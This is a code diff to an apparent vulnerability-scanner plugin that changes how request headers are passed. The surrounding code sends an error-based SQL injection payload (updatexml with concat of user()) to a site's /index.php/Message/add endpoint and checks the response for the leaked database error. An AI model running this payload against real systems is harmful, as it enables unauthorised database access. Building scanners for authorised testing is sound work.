@@ -31,7 +31,7 @@ def UrlProcessing(url):
         res = urllib.parse.urlparse('http://%s' % url)
     return res.scheme, res.hostname, res.port
 
-def medusa(Url,RandomAgent,proxies=None,**kwargs):
+def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
     proxies=ClassCongregation.Proxies().result(proxies)
 
     scheme, url, port = UrlProcessing(Url)
@@ -45,15 +45,11 @@ def medusa(Url,RandomAgent,proxies=None,**kwargs):
         payload="/index.php/Message/add"
         data = "contacts[content`,`create_time`,`update_time`) VALUES ('1', '1' ,1 and updatexml(1,concat(0x3a,user()),1) );-- a] = 11231231313&mobile=2&content=3"
         payload_url = scheme + "://" + url +":"+ str(port) + payload
-        headers = {
-            'User-Agent': RandomAgent,
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-            "Accept-Encoding": "gzip, deflate",
-        }
+        Headers['Content-Type']='application/x-www-form-urlencoded'
+        Headers['Accept']='text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
 
-        resp = requests.post(payload_url, headers=headers, timeout=6, data=data, proxies=proxies, verify=False)
+
+        resp = requests.post(payload_url, headers=Headers, timeout=6, data=data, proxies=proxies, verify=False)
         con = resp.text
         code = resp.status_code
         if code== 200 and con.find('错误信息') != -1 and con.find('''(`content`,`create_time`,`update_time`) VALUES ('1', '1' ,1 and updatexml(1,concat(0x3a,user()),1) )''')!=-1 and con.find('执行SQL发生错误') != -1:
